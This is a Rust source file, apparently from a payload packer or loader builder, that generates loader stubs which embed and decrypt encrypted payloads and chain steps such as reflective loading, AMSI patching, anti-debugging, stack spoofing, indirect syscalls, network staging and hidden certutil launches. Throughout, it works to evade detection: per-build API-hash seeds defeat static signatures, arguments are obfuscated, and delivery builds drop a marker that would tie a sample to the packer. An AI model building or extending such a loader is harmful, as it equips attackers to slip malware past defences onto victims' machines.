//! Step-based stub rendering (schema 6).
//!
//! A schema-6 plan has one ordered `runtime:` list. This module renders
//! `src/engine/templates/main.rs.tpl`: every Execution step embeds and decrypts its own
//! payload, each technique gets its own `mod step_<i>` (so two steps can use the
//! same technique without colliding on top-level names), and a generated runner
//! walks the steps in order with the declared [`StepControl`] gating.
//!
//! The same renderer serves the builtin template and a custom loader stub
//! (`build.stub.path`): the builtin must contain every placeholder (a missing one
//! is an error), while a custom stub may omit the ones it does not use — the
//! renderer then warns about each ignored block.

use std::collections::BTreeMap;

use super::api_resolution::{ApiResolutionConfig, ApiResolutionMode};
use super::obfuscation::StringsConfig;
use super::syscalls::{self, SyscallsConfig, SyscallsMode};
use super::{args, debug, imports, stub, BuildError, Result};
use crate::plan::schema::{
    DllEntry, OutputKind, PayloadFormat, StepControl, StepFailure, StepOutcome,
};
use crate::techniques::{Category, RuntimeStep, TechniqueKind};

/// The builtin template's required placeholders (its contract).
const REQUIRED: &[&str] = &[
    "$STUB_HELPERS$",
    "$ENTRY_BLOCK$",
    "$STEP_MODULES$",
    "$STEP_RUNNER_BODY$",
    "$SYSCALLS_BLOCK$",
    "$ARGS_BLOCK$",
    "$IMPORTS_BLOCK$",
    "$API_RESOLUTION_BLOCK$",
    "$STAGER_BLOCK$",
];

/// The shared stub helpers (string obfuscation and per-step decryption).
///
/// Rendered as `$STUB_HELPERS$` for the builtin template and any custom stub that
/// uses the generated runner.
const STUB_HELPERS: &str = r#"// --- Shared helpers (string obfuscation + per-step decryption) ---
#[inline(never)]
#[allow(dead_code)]
fn dec_xor(bytes: &[u8], key: &[u8; 32]) -> Vec<u8> {
    let mut out = bytes.to_vec();
    for (i, b) in out.iter_mut().enumerate() {
        *b ^= key[i % 32];
    }
    out
}

/// Decrypts one step's payload, verifying the Poly1305 tag and the size.
#[allow(dead_code)]
fn decrypt_step(enc: &[u8], nonce_hex: &str, key_hex: &str, len: usize) -> Result<Vec<u8>, String> {
    let nonce_vec = hex::decode(nonce_hex).map_err(|e| format!("invalid nonce: {e}"))?;
    let nonce: [u8; 24] = nonce_vec
        .try_into()
        .map_err(|_| "the nonce must be 24 bytes".to_string())?;
    let key_vec = hex::decode(key_hex).map_err(|e| format!("invalid key: {e}"))?;
    let key: [u8; 32] = key_vec
        .try_into()
        .map_err(|_| "the key must be 32 bytes".to_string())?;
    let cipher = XChaCha20Poly1305::new(Key::from_slice(&key));
    let image = cipher
        .decrypt(XNonce::from_slice(&nonce), enc)
        .map_err(|_| "decryption failed: wrong key/nonce or tampered payload".to_string())?;
    if image.len() != len {
        return Err("decrypted payload size does not match the expected size".to_string());
    }
    Ok(image)
}
"#;

/// One payload handed to the renderer, already encrypted.
#[derive(Debug, Clone)]
pub struct PayloadCipher {
    /// XChaCha20 nonce (24 bytes).
    pub nonce: [u8; 24],
    /// Symmetric key (32 bytes).
    pub key: [u8; 32],
    /// Original payload size.
    pub plaintext_len: usize,
    /// Path to the ciphertext for `include_bytes!` (relative to `main.rs`).
    pub path: String,
    /// The payload's binary format (selects the Execution fragment).
    pub format: PayloadFormat,
    /// Exported function for `format: dll`.
    pub export: Option<String>,
    /// The payload's fixed arguments (`build.payloads.<name>.args`).
    pub args: Vec<String>,
    /// Whether the runtime args replace the YAML ones.
    pub args_override: bool,
    /// Per-build stub marker (self-test affordance). Printed to stderr only in
    /// a debug artifact (`build.stub.debug`); ignored, and never embedded,
    /// otherwise.
    pub marker: String,
    /// Whether the payload is staged (fetched at run time by a `network_stager`
    /// step) rather than embedded. When true, `path`/`nonce`/`key`/`plaintext_len`
    /// are unused.
    pub staged: bool,
}

/// One resolved step handed to the renderer.
#[derive(Debug, Clone)]
pub struct StepPayload {
    /// Position in the runtime list (0-based).
    pub index: usize,
    /// Human label.
    pub label: String,
    /// The technique call and its parameters.
    pub technique: TechniqueKind,
    /// How the loader reacts to this step's result.
    pub control: StepControl,
    /// The encrypted payload, for an Execution technique.
    pub payload: Option<PayloadCipher>,
}

/// Everything the step template needs.
#[derive(Debug, Clone)]
pub struct StepsParams {
    /// The ordered steps.
    pub steps: Vec<StepPayload>,
    /// Positional build args, exposed as `$ARG_<key>$`.
    pub build_args: BTreeMap<String, String>,
    /// Whether the stub is a debug artifact.
    pub debug: bool,
    /// Whether the artifact uses the `windows` subsystem.
    pub windows_subsystem: bool,
    /// What the artifact is (`build.output.kind`).
    pub kind: OutputKind,
    /// What starts the chain in a DLL build (`build.output.entry`).
    pub entry: DllEntry,
}

/// A rendered stub plus the non-fatal warnings a custom template produced.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RenderedSteps {
    /// The substituted Rust source.
    pub source: String,
    /// Non-fatal warnings (a custom stub ignoring a block).
    pub warnings: Vec<String>,
}

/// Renders the builtin step template, failing when a required placeholder is
/// missing.
pub fn render_builtin(
    template: &str,
    params: &StepsParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<String> {
    for required in REQUIRED {
        if !template.contains(required) {
            return Err(BuildError::InvalidTemplate(format!(
                "placeholder '{required}' does not appear in the builtin step template"
            )));
        }
    }
    Ok(render_common(template, params, strings, syscalls_config, api_resolution)?.source)
}

/// Renders a custom loader stub template.
///
/// The template may omit any placeholder; the only hard requirement (enforced
/// separately by [`stub::validate_custom_stub_template`]) is a `fn main()` — or,
/// for a template that wants the generated entry, `$ENTRY_BLOCK$` instead. When
/// it ignores a block the declared techniques need, a warning is returned.
pub fn render_custom(
    template: &str,
    params: &StepsParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<RenderedSteps> {
    let mut warnings = Vec::new();
    if !params.steps.is_empty() && !template.contains("$STEP_MODULES$") {
        warnings.push(
            "loader stub does not reference $STEP_MODULES$; the declared techniques will have no \
             effect"
                .to_string(),
        );
    }
    if !params.steps.is_empty() && !template.contains("$STEP_RUNNER_BODY$") {
        warnings.push(
            "loader stub does not reference $STEP_RUNNER_BODY$; no step will ever run".to_string(),
        );
    }
    let union = union_of(params);
    if syscalls_config.mode == SyscallsMode::Indirect
        && !syscalls::required(&union).is_empty()
        && !template.contains("$SYSCALLS_BLOCK$")
    {
        warnings.push(
            "loader stub does not reference $SYSCALLS_BLOCK$; the declared techniques' nt_* calls \
             will fail to compile"
                .to_string(),
        );
    }
    if imports::needed(&union) && !template.contains("$IMPORTS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $IMPORTS_BLOCK$; the declared techniques' payload \
             imports will not be resolved"
                .to_string(),
        );
    }
    if args::needed(&union) && !template.contains("$ARGS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $ARGS_BLOCK$; the declared techniques' payload command \
             line will not be built"
                .to_string(),
        );
    }
    if api_resolution.mode == ApiResolutionMode::Proxy
        && !api_resolution.apis.is_empty()
        && imports::needed(&union)
        && !template.contains("$API_RESOLUTION_BLOCK$")
    {
        warnings.push(
            "loader stub does not reference $API_RESOLUTION_BLOCK$; the declared API resolution \
             proxies will not be installed"
                .to_string(),
        );
    }

    render_common(template, params, strings, syscalls_config, api_resolution).map(|mut rendered| {
        rendered.warnings = warnings;
        rendered
    })
}

/// Renders any template by building the placeholder values and substituting.
fn render_common(
    template: &str,
    params: &StepsParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<RenderedSteps> {
    let union = union_of(params);

    // One per-build seed for the API-hashing resolver's FNV-1a offset basis, so
    // its emitted hash constants are unique to this artifact instead of a fixed
    // static signature. Emitted into the stub as `API_HASH_SEED`.
    let api_hash_seed: u64 = rand::random();

    let modules: String = params
        .steps
        .iter()
        .map(|step| render_step_module(step, strings))
        .collect::<Result<Vec<_>>>()?
        .concat();
    let runner = render_runner_body(&params.steps, strings, params.debug)?;

    let mut values = BTreeMap::new();
    values.insert("$STUB_HELPERS$".to_string(), STUB_HELPERS.to_string());
    // The entry point: `fn main()` for an executable, the exports for a DLL
    // (`build.output.kind`/`entry`). A custom stub that defines its own `fn main`
    // simply omits the placeholder.
    values.insert(
        "$ENTRY_BLOCK$".to_string(),
        super::entry::render(params.kind, &params.entry),
    );
    values.insert("$STEP_MODULES$".to_string(), modules);
    values.insert("$STEP_RUNNER_BODY$".to_string(), runner);
    values.insert(
        "$SYSCALLS_BLOCK$".to_string(),
        syscalls::render_block_with(
            syscalls_config,
            &union,
            strings,
            &api_resolution.required_syscalls(),
            api_hash_seed,
        ),
    );
    // Per-step payload args are delivered through a thread-local context the
    // runner sets before each Execution step (`crate::set_stage_args`).
    values.insert(
        "$ARGS_BLOCK$".to_string(),
        args::render_block(&union, strings),
    );
    values.insert(
        "$IMPORTS_BLOCK$".to_string(),
        imports::render_block(&union, strings),
    );
    values.insert(
        "$API_RESOLUTION_BLOCK$".to_string(),
        if imports::needed(&union) {
            super::api_resolution::render_block(api_resolution, strings)
        } else {
            String::new()
        },
    );
    values.insert(
        "$STAGER_BLOCK$".to_string(),
        if params
            .steps
            .iter()
            .any(|step| matches!(step.technique, TechniqueKind::NetworkStager { .. }))
        {
            super::stager::render_block()
        } else {
            String::new()
        },
    );
    for (name, value) in &params.build_args {
        values.insert(format!("$ARG_{name}$"), value.clone());
    }

    let mut source = stub::substitute_template(template, &values)?;
    source.push_str(debug::render_prelude(
        params.debug,
        params.windows_subsystem,
    ));
    Ok(RenderedSteps {
        source,
        warnings: Vec::new(),
    })
}

/// The union of every step's technique, for the shared blocks.
fn union_of(params: &StepsParams) -> Vec<RuntimeStep> {
    params
        .steps
        .iter()
        .map(|step| RuntimeStep::new(step.technique.clone()))
        .collect()
}

/// Renders one step's private module, or `None` for an inline `sleep` step.
fn render_step_module(step: &StepPayload, strings: &StringsConfig) -> Result<String> {
    if let TechniqueKind::Sleep { .. } = &step.technique {
        // A sleep is a single line, not a module.
        return Ok(String::new());
    }
    if let TechniqueKind::StackSpoofing { .. } = &step.technique {
        // Stack spoofing is not a step module either: its block replaces the
        // syscall layer's trampoline, so it is injected into `$SYSCALLS_BLOCK$`
        // (a symbol can only exist once). Nothing runs when the runner reaches
        // it.
        return Ok(String::new());
    }

    let format = step
        .payload
        .as_ref()
        .map_or(PayloadFormat::Pe, |payload| payload.format);
    let export = step
        .payload
        .as_ref()
        .and_then(|payload| payload.export.as_deref());
    let fragment = step.technique.render_fragment(strings, format, export);

    let body = match step.technique.category() {
        Category::Preparation => format!(
            "{fragment}\n    pub fn run() -> Result<bool, String> {{\n        {}().map_err(|e| e.to_string())\n    }}\n",
            step.technique.name()
        ),
        Category::Execution => {
            // A fragment that executes the payload must be an Execution
            // technique with a resolved payload.
            if step.payload.is_none() {
                return Err(BuildError::InvalidTemplate(format!(
                    "step {} ('{}') is an execution technique without a payload",
                    step.index,
                    step.technique.name()
                )));
            }
            format!(
                "{fragment}\n    pub fn payload(image: &mut [u8]) -> Result<i32, String> {{\n        execute_payload(image)\n    }}\n"
            )
        }
        Category::Control => format!(
            "{fragment}\n    pub fn run() -> Result<i32, String> {{\n        run_exec()\n    }}\n"
        ),
    };
    Ok(format!("mod step_{} {{\n{body}}}\n", step.index))
}

/// Renders the runner body: one straight-line block per step, in order.
fn render_runner_body(
    steps: &[StepPayload],
    strings: &StringsConfig,
    debug: bool,
) -> Result<String> {
    let mut body = String::new();
    for step in steps {
        body.push_str(&format!(
            "\n    // --- step {}: {} ---\n",
            step.index, step.label
        ));
        if step.control.delay_ms > 0 {
            body.push_str(&sleep_line(step.control.delay_ms));
        }
        let success = success_action(step.control.on_success);
        let failure = failure_action(step.control.on_fail);
        match &step.technique {
            TechniqueKind::Sleep { params } => {
                body.push_str(&sleep_line(params.ms));
            }
            TechniqueKind::StackSpoofing { .. } => {
                // Installed with the syscall layer at startup: there is nothing
                // to run, and nothing to report.
            }
            technique => match technique.category() {
                Category::Preparation => {
                    body.push_str(&format!(
                        "    match step_{index}::run() {{\n\
                         \x20       Ok(true) => {{{success}}}\n\
                         \x20       Ok(false) => return Ok(0),\n\
                         \x20       Err(e) => {{{failure}}}\n\
                         \x20   }}\n",
                        index = step.index,
                    ));
                }
                Category::Execution => {
                    let payload = step.payload.as_ref().ok_or_else(|| {
                        BuildError::InvalidTemplate(format!(
                            "step {} ('{}') is an execution technique without a payload",
                            step.index,
                            technique.name()
                        ))
                    })?;
                    body.push_str(&render_execution_block(
                        step.index, payload, strings, success, failure, debug,
                    ));
                }
                Category::Control => {
                    body.push_str(&format!(
                        "    match step_{index}::run() {{\n\
                         \x20       Ok(code) => {{\n\
                         \x20           last = code;{success}\n\
                         \x20       }}\n\
                         \x20       Err(e) => {{{failure}}}\n\
                         \x20   }}\n",
                        index = step.index,
                    ));
                }
            },
        }
    }
    Ok(body)
}

/// The runner block that decrypts and runs an Execution step's payload.
///
/// `debug` is the *only* thing that decides whether the per-build `stub_marker`
/// is emitted. A delivery build (`debug == false`) must stay silent: the marker
/// is a runtime token that links a running sample to the packer, so both the
/// print and the obfuscated string are left out of the generated source
/// entirely. `build.stub.debug` is a laboratory-only affordance.
fn render_execution_block(
    index: usize,
    payload: &PayloadCipher,
    strings: &StringsConfig,
    success: &str,
    failure: &str,
    debug: bool,
) -> String {
    let marker_line = if debug {
        let marker = strings
            .obfuscate(&payload.marker)
            .render_stub_expr("stub_marker");
        format!(
            "        let stub_marker: String = {marker};\n\
             \x20       eprintln!(\"{{stub_marker}}\");\n"
        )
    } else {
        String::new()
    };
    let args = args_expr(&payload.args, strings);
    let overridden = if payload.args_override {
        "true"
    } else {
        "false"
    };

    if payload.staged {
        // A staged payload is fetched at run time by a preceding `network_stager`
        // step and read from the shared slot, so there is no embedded ciphertext.
        return format!(
            "    {{\n\
             \x20       crate::set_stage_args({args}, {overridden});\n\
             \x20       let mut image = crate::take_staged_payload()?;\n\
             {marker_line}\
             \x20       match step_{index}::payload(&mut image) {{\n\
             \x20           Ok(code) => {{\n\
             \x20               last = code;{success}\n\
             \x20           }}\n\
             \x20           Err(e) => {{{failure}}}\n\
             \x20       }}\n\
             \x20   }}\n",
            args = args,
            overridden = overridden,
            marker_line = marker_line,
            index = index,
        );
    }

    format!(
        "    {{\n\
         \x20       crate::set_stage_args({args}, {overridden});\n\
         \x20       let enc: &[u8] = include_bytes!(\"{path}\");\n\
         \x20       let mut image = decrypt_step(enc, \"{nonce}\", \"{key}\", {len})?;\n\
         {marker_line}\
         \x20       match step_{index}::payload(&mut image) {{\n\
         \x20           Ok(code) => {{\n\
         \x20               last = code;{success}\n\
         \x20           }}\n\
         \x20           Err(e) => {{{failure}}}\n\
         \x20       }}\n\
         \x20   }}\n",
        args = args,
        overridden = overridden,
        path = payload.path,
        nonce = hex::encode(payload.nonce),
        key = hex::encode(payload.key),
        len = payload.plaintext_len,
        marker_line = marker_line,
        index = index,
    )
}

/// One inline sleep.
fn sleep_line(ms: u64) -> String {
    format!("    std::thread::sleep(std::time::Duration::from_millis({ms}));\n")
}

/// The `Vec<String>` expression for a step's YAML args, rebuilt at run time.
fn args_expr(args: &[String], strings: &StringsConfig) -> String {
    if args.is_empty() {
        return "vec![]".to_string();
    }
    let mut body = String::from("vec![\n");
    for (index, arg) in args.iter().enumerate() {
        let expr = strings
            .obfuscate(arg)
            .render_stub_expr(&format!("step_arg_{index}"));
        body.push_str(&format!("            {expr},\n"));
    }
    body.push_str("        ]");
    body
}

/// The `on_success` code appended after a step sets `last`.
fn success_action(outcome: StepOutcome) -> &'static str {
    match outcome {
        StepOutcome::Continue => "",
        StepOutcome::Stop => " return Ok(last);",
        StepOutcome::Exit => " return Ok(0);",
    }
}

/// The `on_fail` code run in the `Err(e)` arm.
fn failure_action(failure: StepFailure) -> &'static str {
    match failure {
        StepFailure::Stop => "return Err(e);",
        StepFailure::Continue => "eprintln!(\"{e}\");",
        StepFailure::Exit => "eprintln!(\"{e}\"); return Ok(0);",
    }
}

/// Test support: builds [`StepsParams`] from a `RuntimeStep` list, attaching the
/// given cipher to every Execution step.
///
/// Lets the ignored compile tests (which think in terms of a technique runtime)
/// drive the step renderer without re-deriving the cipher plumbing.
#[cfg(test)]
pub(crate) fn test_params(
    runtime: &[RuntimeStep],
    encrypted: &crate::engine::crypto::EncryptedPayload,
    payload_path: &str,
    format: PayloadFormat,
    export: Option<&str>,
    debug: bool,
) -> StepsParams {
    let steps = runtime
        .iter()
        .enumerate()
        .map(|(index, step)| {
            let payload = (step.category() == Category::Execution).then(|| PayloadCipher {
                nonce: encrypted.nonce,
                key: encrypted.key,
                plaintext_len: encrypted.plaintext_len,
                path: payload_path.to_string(),
                format,
                export: export.map(str::to_string),
                args: Vec::new(),
                args_override: false,
                marker: stub::generate_stub_marker(),
                staged: false,
            });
            StepPayload {
                index,
                label: step.name().to_string(),
                technique: step.technique.clone(),
                control: step.control,
                payload,
            }
        })
        .collect();
    StepsParams {
        steps,
        build_args: BTreeMap::new(),
        debug,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::plan::schema::{Arch, StepFailure, StepOutcome};
    use crate::techniques::living_off_the_land;
    use crate::techniques::sleep;

    fn strings() -> StringsConfig {
        StringsConfig::from_yaml(None).expect("default strings")
    }

    fn cipher(path: &str, marker: &str) -> PayloadCipher {
        PayloadCipher {
            nonce: [0u8; 24],
            key: [0u8; 32],
            plaintext_len: 16,
            path: path.to_string(),
            format: PayloadFormat::Shellcode,
            export: None,
            args: Vec::new(),
            args_override: false,
            marker: marker.to_string(),
            staged: false,
        }
    }

    fn execution_step(index: usize) -> StepPayload {
        StepPayload {
            index,
            label: format!("reflective_loading 'p{index}'"),
            technique: serde_yml::from_str("technique: reflective_loading\n").expect("technique"),
            control: StepControl::default(),
            payload: Some(cipher(
                &format!("payload_{index}.bin"),
                &format!("STUB_MARKER_{index}"),
            )),
        }
    }

    fn preparation_step(index: usize) -> StepPayload {
        StepPayload {
            index,
            label: "patch_amsi".to_string(),
            technique: serde_yml::from_str("technique: patch_amsi\n").expect("technique"),
            control: StepControl::default(),
            payload: None,
        }
    }

    fn lol_step(index: usize) -> StepPayload {
        StepPayload {
            index,
            label: "living_off_the_land".to_string(),
            technique: TechniqueKind::LivingOffTheLand {
                params: living_off_the_land::Params {
                    binary: "certutil.exe".to_string(),
                    args: vec!["-f".to_string()],
                    ..Default::default()
                },
            },
            control: StepControl::default(),
            payload: None,
        }
    }

    fn sleep_step(index: usize, ms: u64) -> StepPayload {
        StepPayload {
            index,
            label: "sleep".to_string(),
            technique: TechniqueKind::Sleep {
                params: sleep::Params { ms },
            },
            control: StepControl::default(),
            payload: None,
        }
    }

    fn template() -> String {
        std::fs::read_to_string(
            std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("src")
                .join("engine")
                .join("templates")
                .join("main.rs.tpl"),
        )
        .expect("template")
    }

    fn render(steps: Vec<StepPayload>) -> String {
        let params = StepsParams {
            steps,
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
        };
        render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render")
    }

    fn render_debug(steps: Vec<StepPayload>) -> String {
        let params = StepsParams {
            steps,
            build_args: BTreeMap::new(),
            debug: true,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
        };
        render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render")
    }

    #[test]
    fn a_delivery_build_emits_no_stub_marker() {
        let out = render(vec![execution_step(0)]);
        assert!(
            !out.contains("stub_marker"),
            "a non-debug build must not touch the marker: {out}"
        );
        assert!(
            !out.contains("STUB_MARKER"),
            "a non-debug build must not embed the marker: {out}"
        );
    }

    #[test]
    fn a_debug_build_prints_the_stub_marker() {
        let out = render_debug(vec![execution_step(0)]);
        assert!(
            out.contains("eprintln!(\"{stub_marker}\")"),
            "a debug build should print the marker: {out}"
        );
    }

    #[test]
    fn two_execution_steps_render_two_modules() {
        let out = render(vec![execution_step(0), execution_step(1)]);
        assert!(out.contains("mod step_0 {"), "step 0 module missing");
        assert!(out.contains("mod step_1 {"), "step 1 module missing");
        assert!(
            out.contains("include_bytes!(\"payload_0.bin\")"),
            "payload 0 not embedded"
        );
        assert!(
            out.contains("include_bytes!(\"payload_1.bin\")"),
            "payload 1 not embedded"
        );
        assert!(out.contains("fn run() -> Result<i32, String>"));
    }

    #[test]
    fn a_preparation_step_is_wrapped_with_a_run_adapter() {
        let out = render(vec![preparation_step(0)]);
        assert!(out.contains("mod step_0 {"), "prep module missing");
        assert!(out.contains("pub fn patch_amsi"), "prep fragment missing");
        assert!(
            out.contains("pub fn run() -> Result<bool, String>"),
            "prep adapter missing"
        );
        assert!(
            out.contains("Ok(false) => return Ok(0)"),
            "the abort arm is missing"
        );
    }

    #[test]
    fn a_living_off_the_land_step_renders_a_launcher() {
        let out = render(vec![lol_step(0)]);
        assert!(out.contains("pub fn run_exec()"), "launcher missing");
        assert!(out.contains("CreateProcessA"), "CreateProcessA missing");
        assert!(out.contains("CREATE_NO_WINDOW"), "hidden window missing");
        assert!(
            out.contains("step_0::run()"),
            "runner does not call the control step"
        );
    }

    #[test]
    fn a_sleep_step_is_a_single_inline_line() {
        let out = render(vec![execution_step(0), sleep_step(1, 250)]);
        assert!(
            out.contains("std::thread::sleep(std::time::Duration::from_millis(250));"),
            "inline sleep missing: {out}"
        );
        assert!(!out.contains("mod step_1 {"), "sleep must not get a module");
    }

    #[test]
    fn per_step_args_reach_the_runner_obfuscated() {
        let mut step = execution_step(0);
        if let Some(payload) = step.payload.as_mut() {
            payload.args = vec!["--first".to_string()];
            payload.args_override = true;
        }
        let out = render(vec![step]);
        assert!(out.contains("crate::set_stage_args("), "step args not set");
        assert!(
            !out.contains("--first"),
            "the arg leaked in cleartext: {out}"
        );
    }

    #[test]
    fn an_exe_build_renders_the_plain_entry() {
        let out = render(vec![execution_step(0)]);
        assert!(
            out.contains(crate::engine::entry::EXE_ENTRY),
            "the executable entry is missing"
        );
        assert!(!out.contains("DllMain"), "an executable exports nothing");
        assert!(!out.contains("dll_run_detached"));
    }

    #[test]
    fn a_dll_build_renders_the_exports_instead_of_main() {
        let params = StepsParams {
            steps: vec![execution_step(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Dll,
            entry: DllEntry::Export("Start".to_string()),
        };
        let source = render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(
            source.contains("pub extern \"system\" fn Start("),
            "export missing"
        );
        assert!(source.contains("fn DllMain"), "DllMain missing");
        assert!(!source.contains("fn main("), "a DLL has no main");
        assert!(
            source.contains("fn run() -> Result<i32, String>"),
            "the chain must stay shared"
        );
        assert!(
            !source.contains("ENTRY_BLOCK"),
            "the placeholder must be substituted"
        );
    }

    /// A custom stub owns its entry point: without `$ENTRY_BLOCK$` nothing is
    /// injected, so the `fn main` it already declares is what runs.
    #[test]
    fn a_custom_stub_keeps_its_own_main() {
        let params = StepsParams {
            steps: Vec::new(),
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
        };
        let rendered = render_custom(
            "fn main() {}\n",
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(rendered.source.starts_with("fn main() {}"));
        assert!(!rendered.source.contains("dll_run_chain"));
    }

    #[test]
    fn a_missing_placeholder_is_an_error() {
        let params = StepsParams {
            steps: vec![execution_step(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
        };
        let result = render_builtin(
            "fn main() {}",
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        );
        assert!(result.is_err());
    }

    #[test]
    fn a_custom_stub_ignoring_the_step_blocks_warns() {
        let params = StepsParams {
            steps: vec![execution_step(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
        };
        let rendered = render_custom(
            "fn main() {}",
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(
            rendered.warnings.iter().any(|w| w.contains("STEP_MODULES")),
            "expected a step-modules warning: {:?}",
            rendered.warnings
        );
        assert!(
            rendered
                .warnings
                .iter()
                .any(|w| w.contains("STEP_RUNNER_BODY")),
            "expected a runner warning: {:?}",
            rendered.warnings
        );
    }

    #[test]
    fn on_success_stop_returns_the_last_code() {
        let mut step = execution_step(0);
        step.control = StepControl {
            on_success: StepOutcome::Stop,
            on_fail: StepFailure::Continue,
            delay_ms: 5,
        };
        let out = render(vec![step]);
        assert!(out.contains("return Ok(last);"), "success stop missing");
        assert!(
            out.contains("eprintln!(\"{e}\");"),
            "failure continue missing"
        );
        assert!(
            out.contains("std::thread::sleep(std::time::Duration::from_millis(5));"),
            "delay missing"
        );
    }

    /// Compiles a preparation + execution + control stub to a PE. The real
    /// end-to-end check of the step renderer; marked `#[ignore]` because it
    /// needs `rustc` and the compiled dependencies (`cargo test -- --ignored`).
    #[test]
    #[ignore = "requires rustc and the compiled dependencies"]
    fn a_step_stub_compiles_to_a_pe() {
        use crate::engine::compiler;

        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("build")
            .join("steps_test");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("payload_1.bin"), [0u8; 16]).unwrap();

        let mut prep = preparation_step(0);
        prep.technique =
            serde_yml::from_str("technique: anti_debug\nparams: { action: continue }\n")
                .expect("technique");
        let params = StepsParams {
            steps: vec![prep, execution_step(1), sleep_step(2, 1), lol_step(3)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
        };
        let source = render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        let main_path = dir.join("main.rs");
        std::fs::write(&main_path, &source).unwrap();

        let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
        let out = dir.join("out.exe");
        compiler::compile_stub(&main_path, &out, &deps, compiler::CompileOptions::default())
            .expect("compile");
        let bytes = std::fs::read(&out).expect("read");
        assert_eq!(&bytes[..2], b"MZ", "the stub must be a Windows PE");
    }

    /// Compiles a `kind: dll` stub and checks the artifact is a real library
    /// that exports the entry points. The end-to-end check of the DLL output;
    /// marked `#[ignore]` for the same reasons as the executable one.
    #[test]
    #[ignore = "requires rustc and the compiled dependencies"]
    fn a_dll_stub_compiles_to_a_library_with_exports() {
        use crate::engine::compiler::{self, CompileOptions};

        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("build")
            .join("dll_test");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("payload_0.bin"), [0u8; 16]).unwrap();

        let params = StepsParams {
            steps: vec![execution_step(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Dll,
            entry: DllEntry::Auto,
        };
        let source = render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        let main_path = dir.join("main.rs");
        std::fs::write(&main_path, &source).unwrap();

        let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
        let out = dir.join("loader.dll");
        compiler::compile_stub(
            &main_path,
            &out,
            &deps,
            CompileOptions {
                kind: OutputKind::Dll,
                ..CompileOptions::default()
            },
        )
        .expect("compile");

        let bytes = std::fs::read(&out).expect("read");
        let info = crate::engine::pe::parse(&bytes).expect("a valid PE");
        assert!(
            crate::engine::pe::is_dll(info.characteristics),
            "IMAGE_FILE_DLL must be set"
        );
        // The export names live in the export directory as plain ASCII.
        let text = String::from_utf8_lossy(&bytes);
        for export in ["DllMain", "JNI_OnLoad", "Run"] {
            assert!(text.contains(export), "missing export '{export}'");
        }
    }
}
